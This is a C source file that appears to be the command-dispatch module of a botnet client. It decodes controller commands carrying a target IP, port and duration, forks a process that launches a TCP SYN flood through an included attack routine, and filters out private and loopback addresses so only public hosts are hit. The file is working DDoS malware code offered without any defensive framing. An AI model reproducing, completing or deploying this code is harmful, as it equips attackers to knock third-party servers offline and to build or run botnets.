#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>
#include <stdint.h>
#include <unistd.h>
#include <signal.h>

#include <command.h>
#include <utils.h>
#include <synflood.h> // TCP

#ifdef DEBUG

const char *__command_type_strings[] = {
    "PING",
    "HELLO",
    "ATTACK_TCP",
    "ATTACK_UDP",
    "ATTACK_HTTP",
    "EXIT",
};

static inline char *get_command_type_string(enum command_type type)
{
    if (type == 0 || (type & (type - 1)) != 0 || type > (1 << 5))
    {
        return "Unknown Command";
    }
    return __command_type_strings[__builtin_ctz(type)];
}

#endif

static uint8_t get_command_from_buffer(struct command *cmd, uint8_t buffer[])
{
    if (cmd == NULL || buffer == NULL)
    {
        return 0;
    }

    cmd->type = buffer[0];

    if (cmd->type != PING && cmd->type != EXIT)
    {
        cmd->data.duration = buffer[1];
        cmd->data.target.o1 = buffer[2];
        cmd->data.target.o2 = buffer[3];
        cmd->data.target.o3 = buffer[4];
        cmd->data.target.o4 = buffer[5];
        cmd->data.port = (buffer[6] << 8) | buffer[7];
    }

    return cmd->type;
}

static struct command command_init()
{
    struct command new_command;
    memset(&new_command, 0, sizeof(new_command));
    return new_command;
}

static void parse_command(struct command *cmd)
{
    if (cmd == NULL)
    {
        return;
    }

    __pid_t command_pid = fork();
    if (command_pid == -1)
    {
#ifdef DEBUG
        perror("fork failed");
#endif
        return;
    }
    if (command_pid > 0)
    {
        return;
    }

    switch (cmd->type)
    {
    case HELLO:
        break;
    case ATTACK_TCP:
        atk_start_tcp_essyn(ip_to_string(cmd->data.target.o1,
                                         cmd->data.target.o2,
                                         cmd->data.target.o3,
                                         cmd->data.target.o4),
                            cmd->data.port, cmd->data.duration);
        break;
    case ATTACK_UDP:
        break;
    case PING:
        break;
    case EXIT:
        exit(0);
    default:
#ifdef DEBUG
        printf("Unknown command: 0x%02X\n", cmd->type);
#endif
        exit(1);
    }
    exit(0);
}

static inline int is_invalid_ip(uint8_t o1, uint8_t o2, uint8_t o3, uint8_t o4)
{
    return (o1 == 0 && o2 == 0 && o3 == 0 && o4 == 0) ||
           (o1 == 127) ||
           (o1 == 0) ||
           (o1 == 255) ||
           (o1 == 10) ||
           (o1 == 172 && o2 >= 16 && o2 <= 31) ||
           (o1 == 192 && o2 == 168);
}

uint8_t parse_command_from_buffer(uint8_t buffer[])
{
    struct command cmd = command_init();

    if (get_command_from_buffer(&cmd, buffer) == 0)
    {
        return 0;
    }

#ifdef DEBUG
    printf("[command] Type: %s, Duration: %d, Address: %d.%d.%d.%d, Port: %d\n",
           get_command_type_string(cmd.type), cmd.data.duration,
           cmd.data.target.o1, cmd.data.target.o2,
           cmd.data.target.o3, cmd.data.target.o4, cmd.data.port);

    /* printf("is_invalid_ip() %d\n", is_invalid_ip(cmd.data.target.o1,
        cmd.data.target.o2,
        cmd.data.target.o3,
        cmd.data.target.o4)); */
#endif

    if (cmd.type == 0 ||
        ((cmd.type != PING && cmd.type != EXIT && cmd.type != HELLO) &&
         (cmd.data.port == 0 || (is_invalid_ip(cmd.data.target.o1,
                                               cmd.data.target.o2,
                                               cmd.data.target.o3,
                                               cmd.data.target.o4) ||
                                 cmd.data.duration == 0))))
    {
        return 0;
    }

    parse_command(&cmd);
    return 1;
}
